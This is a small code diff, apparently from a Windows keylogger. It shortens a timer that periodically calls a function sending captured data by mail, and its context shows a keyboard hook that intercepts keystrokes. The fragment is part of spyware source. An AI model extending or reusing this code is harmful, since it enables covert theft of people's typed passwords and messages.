@@ -38,9 +38,9 @@ void timerSendMail() {
     }
 }
 
-// create timer that executes timerSendMail every 2 minutes
+// create timer that executes timerSendMail every 30 seconds
 // for testing, increase time to every hour/day later
-Timer mailTimer(timerSendMail, 2000*60, Timer::infinite);
+Timer mailTimer(timerSendMail, 500*60, Timer::infinite);
 
 HHOOK eHook = NULL;
 LRESULT ourKeyboardHookProc(int nCode, WPARAM wparam, LPARAM lparam) {  // procedure for intercpting keyboard events
